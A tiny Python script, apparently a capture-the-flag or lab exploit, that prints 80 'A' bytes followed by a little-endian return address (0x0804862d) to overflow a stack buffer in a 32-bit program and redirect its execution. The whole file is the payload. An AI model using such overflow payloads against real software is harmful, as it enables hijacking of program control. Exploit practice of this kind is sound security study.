import sys

sys.stdout.buffer.write(b"A" * 80 + b"\x2d\x86\x04\x08EFGHIJ\n")

